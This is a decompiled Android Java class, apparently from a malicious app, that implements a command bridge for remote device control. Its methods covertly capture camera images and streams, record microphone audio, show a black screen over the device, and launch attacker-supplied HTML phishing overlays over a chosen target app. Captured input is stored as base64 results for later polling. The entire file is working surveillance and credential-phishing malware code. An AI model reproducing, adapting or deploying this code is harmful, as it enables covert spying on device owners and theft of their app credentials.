package com.servers.ozzbzk;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Binder;
import android.os.Bundle;
import android.os.Process;
import android.util.Base64;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import org.json.JSONObject;

/* loaded from: classes.dex */
public class BridgeProvider extends ContentProvider {
    private static final long CAMERA_PROXY_POLL_MS = 12000;
    private static final long CAMERA_PROXY_STEP_MS = 200;
    private static final int PHISH_BRIDGE_VERSION = 3;
    private static final String TAG = "BridgeProvider";
    private static volatile boolean blackScreenActive;
    private static volatile Bundle pendingCameraResult;
    private static volatile Bundle pendingPhishResult;
    private AudioCaptureHelper audioHelper;
    private CameraCaptureHelper cameraHelper;
    private OverlayHelper overlayHelper;

    @Override // android.content.ContentProvider
    public int delete(Uri uri, String str, String[] strArr) {
        return 0;
    }

    @Override // android.content.ContentProvider
    public String getType(Uri uri) {
        return null;
    }

    @Override // android.content.ContentProvider
    public Uri insert(Uri uri, ContentValues contentValues) {
        return null;
    }

    @Override // android.content.ContentProvider
    public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) {
        return null;
    }

    @Override // android.content.ContentProvider
    public int update(Uri uri, ContentValues contentValues, String str, String[] strArr) {
        return 0;
    }

    public static void setCameraResult(Bundle bundle) {
        pendingCameraResult = bundle;
    }

    public static Bundle consumeCameraResult() {
        Bundle bundle = pendingCameraResult;
        pendingCameraResult = null;
        return bundle;
    }

    public static boolean hasCameraResult() {
        return pendingCameraResult != null;
    }

    @Override // android.content.ContentProvider
    public boolean onCreate() {
        Context context = getContext();
        if (context == null) {
            return true;
        }
        this.cameraHelper = new CameraCaptureHelper(context);
        this.audioHelper = new AudioCaptureHelper(context);
        this.overlayHelper = new OverlayHelper(context);
        return true;
    }

    @Override // android.content.ContentProvider
    public Bundle call(String str, String str2, Bundle bundle) {
        int callingUid = Binder.getCallingUid();
        int myUid = Process.myUid();
        if (callingUid != 0 && callingUid != 1000 && callingUid != 2000 && callingUid != myUid) {
            return null;
        }
        if (str == null) {
            return err("null method");
        }
        ensureHelpers();
        str.hashCode();
        char c = 65535;
        switch (str.hashCode()) {
            case -1190505608:
                if (str.equals("stop_service")) {
                    c = 0;
                    break;
                }
                break;
            case -1088235805:
                if (str.equals("stream_start")) {
                    c = 1;
                    break;
                }
                break;
            case -116191551:
                if (str.equals("overlay_status")) {
                    c = 2;
                    break;
                }
                break;
            case 3441010:
                if (str.equals("ping")) {
                    c = 3;
                    break;
                }
                break;
            case 23409423:
                if (str.equals("phish_check")) {
                    c = 4;
                    break;
                }
                break;
            case 109883352:
                if (str.equals("start_service")) {
                    c = 5;
                    break;
                }
                break;
            case 285574097:
                if (str.equals("overlay_hide")) {
                    c = 6;
                    break;
                }
                break;
            case 285901196:
                if (str.equals("overlay_show")) {
                    c = 7;
                    break;
                }
                break;
            case 784992953:
                if (str.equals("audio_start")) {
                    c = '\b';
                    break;
                }
                break;
            case 832189019:
                if (str.equals("phish_hide")) {
                    c = '\t';
                    break;
                }
                break;
            case 832433368:
                if (str.equals("phish_poll")) {
                    c = '\n';
                    break;
                }
                break;
            case 977376908:
                if (str.equals("phish_launch")) {
                    c = 11;
                    break;
                }
                break;
            case 1119068550:
                if (str.equals("blackscreen_status")) {
                    c = '\f';
                    break;
                }
                break;
            case 1152793334:
                if (str.equals("phish_result")) {
                    c = '\r';
                    break;
                }
                break;
            case 1220936662:
                if (str.equals("blackscreen_hide")) {
                    c = 14;
                    break;
                }
                break;
            case 1221263761:
                if (str.equals("blackscreen_show")) {
                    c = 15;
                    break;
                }
                break;
            case 1549249160:
                if (str.equals("audio_poll")) {
                    c = 16;
                    break;
                }
                break;
            case 1549343435:
                if (str.equals("audio_stop")) {
                    c = 17;
                    break;
                }
                break;
            case 1627464033:
                if (str.equals("stream_stop")) {
                    c = 18;
                    break;
                }
                break;
            case 1634352172:
                if (str.equals("camera_capture")) {
                    c = 19;
                    break;
                }
                break;
        }
        switch (c) {
            case 0:
                return stopFg();
            case 1:
                return streamStart(bundle);
            case 2:
                return overlayStatus();
            case PHISH_BRIDGE_VERSION /* 3 */:
                return ok();
            case 4:
                return phishCheck();
            case 5:
                return startFg();
            case 6:
                return overlayHide();
            case 7:
                return overlayShow(str2, bundle);
            case '\b':
                return audioStart(bundle);
            case '\t':
                return phishHide();
            case '\n':
                return phishPoll();
            case 11:
                return phishLaunch(bundle);
            case '\f':
                return blackScreenStatus();
            case '\r':
                return phishResult(bundle);
            case 14:
                return blackScreenHide();
            case 15:
                return blackScreenShow();
            case 16:
                return audioPoll();
            case 17:
                return audioStop();
            case 18:
                return streamStop();
            case 19:
                return cameraCapture(bundle);
            default:
                return err("unknown: " + str);
        }
    }

    private void ensureHelpers() {
        Context context = getContext();
        if (context == null) {
            return;
        }
        if (this.cameraHelper == null) {
            this.cameraHelper = new CameraCaptureHelper(context);
        }
        if (this.audioHelper == null) {
            this.audioHelper = new AudioCaptureHelper(context);
        }
        if (this.overlayHelper == null) {
            this.overlayHelper = new OverlayHelper(context);
        }
    }

    private Bundle cameraCapture(Bundle bundle) {
        if (this.cameraHelper == null) {
            return err("no camera helper");
        }
        int i = bundle != null ? bundle.getInt("camera_id", 0) : 0;
        int i2 = bundle != null ? bundle.getInt("quality", 85) : 85;
        try {
            startFg();
            byte[] latestJpeg = this.cameraHelper.isStreaming() ? this.cameraHelper.getLatestJpeg() : null;
            if (latestJpeg == null || latestJpeg.length == 0) {
                latestJpeg = this.cameraHelper.captureOnce(i);
            }
            if (latestJpeg != null && latestJpeg.length > 0) {
                Bundle ok = ok();
                ok.putByteArray("jpeg", latestJpeg);
                ok.putString("method", "camera2");
                return ok;
            }
            Log.w(TAG, "Camera2/FGS capture failed — launching CameraProxyActivity");
            return cameraCaptureViaProxy(i, i2);
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    private Bundle cameraCaptureViaProxy(int i, int i2) {
        byte[] byteArray;
        Context context = getContext();
        if (context == null) {
            return err("no context");
        }
        pendingCameraResult = null;
        try {
            Intent intent = new Intent(context, (Class<?>) CameraProxyActivity.class);
            intent.putExtra("camera_id", i);
            intent.putExtra("quality", i2);
            intent.addFlags(1350631424);
            context.startActivity(intent);
            long currentTimeMillis = System.currentTimeMillis() + CAMERA_PROXY_POLL_MS;
            while (System.currentTimeMillis() < currentTimeMillis) {
                Bundle bundle = pendingCameraResult;
                if (bundle != null && bundle.getBoolean("has_result", false)) {
                    pendingCameraResult = null;
                    if (bundle.getBoolean("success", false) && (byteArray = bundle.getByteArray("jpeg")) != null && byteArray.length > 0) {
                        Bundle ok = ok();
                        ok.putByteArray("jpeg", byteArray);
                        ok.putString("method", "camera_proxy");
                        return ok;
                    }
                    return err(bundle.getString("error", "proxy capture failed"));
                }
                try {
                    Thread.sleep(CAMERA_PROXY_STEP_MS);
                } catch (InterruptedException unused) {
                    Thread.currentThread().interrupt();
                    return err("interrupted");
                }
            }
            return err("proxy capture timeout");
        } catch (Exception e) {
            return err("proxy launch: " + e.getMessage());
        }
    }

    private Bundle blackScreenShow() {
        Context context = getContext();
        if (context == null) {
            return err("no context");
        }
        try {
            Intent intent = new Intent(context, (Class<?>) BlackScreenActivity.class);
            intent.addFlags(872415232);
            context.startActivity(intent);
            blackScreenActive = true;
            Bundle ok = ok();
            ok.putString("status", "ok");
            ok.putString("method", "activity");
            return ok;
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    private Bundle blackScreenHide() {
        Context context = getContext();
        blackScreenActive = false;
        if (context != null) {
            try {
                Intent intent = new Intent(context, (Class<?>) BlackScreenActivity.class);
                intent.addFlags(805306368);
                intent.putExtra("action", "finish");
                context.startActivity(intent);
            } catch (Exception e) {
                Log.w(TAG, "blackscreen hide: " + e.getMessage());
            }
        }
        Bundle ok = ok();
        ok.putString("status", "ok");
        return ok;
    }

    private Bundle blackScreenStatus() {
        Bundle ok = ok();
        ok.putBoolean("active", blackScreenActive);
        return ok;
    }

    private Bundle streamStart(Bundle bundle) {
        if (this.cameraHelper == null) {
            return err("no camera helper");
        }
        try {
            this.cameraHelper.startStream(bundle != null ? bundle.getInt("camera_id", 0) : 0);
            return ok();
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    private Bundle streamStop() {
        CameraCaptureHelper cameraCaptureHelper = this.cameraHelper;
        if (cameraCaptureHelper == null) {
            return ok();
        }
        try {
            cameraCaptureHelper.stopStream();
            return ok();
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    private Bundle audioStart(Bundle bundle) {
        if (this.audioHelper == null) {
            return err("no audio helper");
        }
        int i = 1;
        int i2 = 8000;
        String str = "mic";
        if (bundle != null) {
            String string = bundle.getString("source", "");
            if (string == null || string.isEmpty()) {
                string = bundle.getString("audio_source", "mic");
            }
            if (string != null && !string.isEmpty()) {
                str = string;
            }
            i2 = bundle.getInt("sample_rate", 8000);
            i = bundle.getInt("channels", 1);
        }
        if (!this.audioHelper.start(str, i2, i)) {
            return err("AudioRecord start failed");
        }
        Bundle ok = ok();
        ok.putString("source", this.audioHelper.getSource());
        return ok;
    }

    private Bundle audioStop() {
        AudioCaptureHelper audioCaptureHelper = this.audioHelper;
        if (audioCaptureHelper != null) {
            audioCaptureHelper.stop();
        }
        return ok();
    }

    private Bundle audioPoll() {
        AudioCaptureHelper audioCaptureHelper = this.audioHelper;
        if (audioCaptureHelper == null) {
            return err("no audio helper");
        }
        return audioCaptureHelper.poll();
    }

    private Bundle overlayShow(String str, Bundle bundle) {
        String str2;
        if (this.overlayHelper == null) {
            return err("no overlay helper");
        }
        if (bundle != null) {
            str2 = bundle.getString("html");
            if (str2 == null || str2.isEmpty()) {
                str2 = bundle.getString("content");
            }
            if ((str2 == null || str2.isEmpty()) && bundle.containsKey("html_b64")) {
                try {
                    String string = bundle.getString("html_b64", "");
                    if (string != null && !string.isEmpty()) {
                        str2 = new String(Base64.decode(string, 2), "UTF-8");
                    }
                } catch (Exception e) {
                    Log.w(TAG, "b64 decode html: " + e.getMessage());
                }
            }
        } else {
            str2 = null;
        }
        return this.overlayHelper.show(str2, str, bundle);
    }

    private Bundle overlayHide() {
        OverlayHelper overlayHelper = this.overlayHelper;
        if (overlayHelper == null) {
            return ok();
        }
        return overlayHelper.hide();
    }

    private Bundle overlayStatus() {
        OverlayHelper overlayHelper = this.overlayHelper;
        if (overlayHelper == null) {
            Bundle ok = ok();
            ok.putBoolean("showing", false);
            return ok;
        }
        return overlayHelper.status();
    }

    private Bundle phishResult(Bundle bundle) {
        pendingPhishResult = bundle != null ? new Bundle(bundle) : new Bundle();
        pendingPhishResult.putLong("received_at", System.currentTimeMillis());
        persistResult(pendingPhishResult);
        Bundle ok = ok();
        ok.putString("status", "ok");
        return ok;
    }

    private Bundle phishPoll() {
        Bundle bundle = pendingPhishResult;
        if (bundle == null) {
            bundle = loadPersistedResult();
        }
        Bundle bundle2 = new Bundle();
        bundle2.putBoolean("success", true);
        bundle2.putString("status", "ok");
        if (bundle != null) {
            bundle2.putAll(bundle);
            bundle2.putBoolean("has_result", true);
            pendingPhishResult = null;
            deletePersistedResult();
        } else {
            bundle2.putBoolean("has_result", false);
        }
        return bundle2;
    }

    private Bundle phishLaunch(Bundle bundle) {
        Context context = getContext();
        if (context == null) {
            return err("no context");
        }
        String string = bundle != null ? bundle.getString("html_b64", "") : "";
        String string2 = bundle != null ? bundle.getString("html_path", "") : "";
        String string3 = bundle != null ? bundle.getString("html", "") : "";
        String string4 = bundle != null ? bundle.getString("target_pkg", "") : "";
        String string5 = bundle != null ? bundle.getString("result_path", "") : "";
        if ((string == null || string.isEmpty()) && ((string2 == null || string2.isEmpty()) && (string3 == null || string3.isEmpty()))) {
            return err("html_b64 or html_path or html required");
        }
        pendingPhishResult = null;
        deletePersistedResult();
        try {
            Intent intent = new Intent(context, (Class<?>) PhishActivity.class);
            if (string != null && !string.isEmpty()) {
                intent.putExtra("html_base64", string);
            } else if (string3 != null && !string3.isEmpty()) {
                intent.putExtra("html_base64", Base64.encodeToString(string3.getBytes("UTF-8"), 2));
            } else {
                intent.putExtra("html_path", string2);
            }
            intent.putExtra("target_pkg", string4 != null ? string4 : "");
            intent.putExtra("result_path", string5 != null ? string5 : "");
            intent.addFlags(1350631424);
            context.startActivity(intent);
            Bundle ok = ok();
            ok.putString("status", "ok");
            ok.putString("method", "activity");
            return ok;
        } catch (Exception e) {
            return phishLaunchViaOverlay(bundle, string3, string, string2, string4, string5, e);
        }
    }

    private Bundle phishLaunchViaOverlay(Bundle bundle, String str, String str2, String str3, String str4, String str5, Exception exc) {
        try {
            if (this.overlayHelper == null) {
                return err(exc.getMessage());
            }
            Bundle bundle2 = new Bundle();
            if (bundle != null) {
                bundle2.putAll(bundle);
            }
            bundle2.putString("target_pkg", str4 != null ? str4 : "");
            if (str5 == null) {
                str5 = "";
            }
            bundle2.putString("result_path", str5);
            Bundle show = this.overlayHelper.show(resolvePhishHtml(str, str2, str3), str4, bundle2);
            if (show != null && show.getBoolean("success", false)) {
                show.putString("status", "ok");
                show.putString("method", "overlay");
            }
            return show != null ? show : err("overlay fallback failed");
        } catch (Exception unused) {
            return err(exc.getClass().getSimpleName() + ": " + exc.getMessage());
        }
    }

    private static String resolvePhishHtml(String str, String str2, String str3) throws Exception {
        if (str != null && !str.isEmpty()) {
            return str;
        }
        if (str2 != null && !str2.isEmpty()) {
            return new String(Base64.decode(str2, 2), "UTF-8");
        }
        if (str3 == null || str3.isEmpty()) {
            return null;
        }
        File file = new File(str3);
        if (!file.exists()) {
            return null;
        }
        FileInputStream fileInputStream = new FileInputStream(file);
        byte[] bArr = new byte[(int) file.length()];
        fileInputStream.read(bArr);
        fileInputStream.close();
        return new String(bArr, "UTF-8");
    }

    private Bundle phishHide() {
        Context context = getContext();
        if (context != null) {
            try {
                Intent intent = new Intent(context, (Class<?>) PhishActivity.class);
                intent.putExtra("action", "finish");
                intent.addFlags(805306368);
                context.startActivity(intent);
            } catch (Exception e) {
                Log.w(TAG, "phishHide: " + e.getMessage());
            }
        }
        OverlayHelper overlayHelper = this.overlayHelper;
        if (overlayHelper != null) {
            overlayHelper.hide();
        }
        Bundle ok = ok();
        ok.putString("status", "ok");
        return ok;
    }

    private Bundle phishCheck() {
        Bundle ok = ok();
        ok.putString("status", "ok");
        ok.putInt("version", PHISH_BRIDGE_VERSION);
        ok.putBoolean("available", true);
        return ok;
    }

    private void persistResult(Bundle bundle) {
        Context context = getContext();
        if (context == null || bundle == null) {
            return;
        }
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("target_pkg", bundle.getString("target_pkg", ""));
            jSONObject.put("data_b64", bundle.getString("data_b64", ""));
            jSONObject.put("dismissed", bundle.getBoolean("dismissed", false));
            jSONObject.put("received_at", bundle.getLong("received_at", 0L));
            File cacheDir = context.getCacheDir();
            File file = new File(cacheDir, "phish_pending.json.tmp");
            File file2 = new File(cacheDir, "phish_pending.json");
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            fileOutputStream.write(jSONObject.toString().getBytes("UTF-8"));
            fileOutputStream.close();
            file.renameTo(file2);
        } catch (Exception e) {
            Log.w(TAG, "persistResult: " + e.getMessage());
        }
    }

    private Bundle loadPersistedResult() {
        Context context = getContext();
        if (context == null) {
            return null;
        }
        try {
            File file = new File(context.getCacheDir(), "phish_pending.json");
            if (!file.exists()) {
                return null;
            }
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] bArr = new byte[(int) file.length()];
            fileInputStream.read(bArr);
            fileInputStream.close();
            JSONObject jSONObject = new JSONObject(new String(bArr, "UTF-8"));
            Bundle bundle = new Bundle();
            bundle.putString("target_pkg", jSONObject.optString("target_pkg", ""));
            bundle.putString("data_b64", jSONObject.optString("data_b64", ""));
            bundle.putBoolean("dismissed", jSONObject.optBoolean("dismissed", false));
            bundle.putLong("received_at", jSONObject.optLong("received_at", 0L));
            return bundle;
        } catch (Exception unused) {
            return null;
        }
    }

    private void deletePersistedResult() {
        Context context = getContext();
        if (context == null) {
            return;
        }
        try {
            new File(context.getCacheDir(), "phish_pending.json").delete();
            new File(context.getCacheDir(), "phish_pending.json.tmp").delete();
        } catch (Exception e) {
            Log.w(TAG, "deletePersistedResult: " + e.getMessage());
        }
    }

    private Bundle startFg() {
        try {
            if (getContext() != null) {
                getContext().startService(new Intent(getContext(), (Class<?>) BridgeService.class));
            }
            return ok();
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    private Bundle stopFg() {
        try {
            if (getContext() != null) {
                getContext().stopService(new Intent(getContext(), (Class<?>) BridgeService.class));
            }
            return ok();
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    private static Bundle ok() {
        Bundle bundle = new Bundle();
        bundle.putBoolean("success", true);
        return bundle;
    }

    private static Bundle err(String str) {
        Bundle bundle = new Bundle();
        bundle.putBoolean("success", false);
        if (str == null) {
            str = "";
        }
        bundle.putString("error", str);
        return bundle;
    }
}
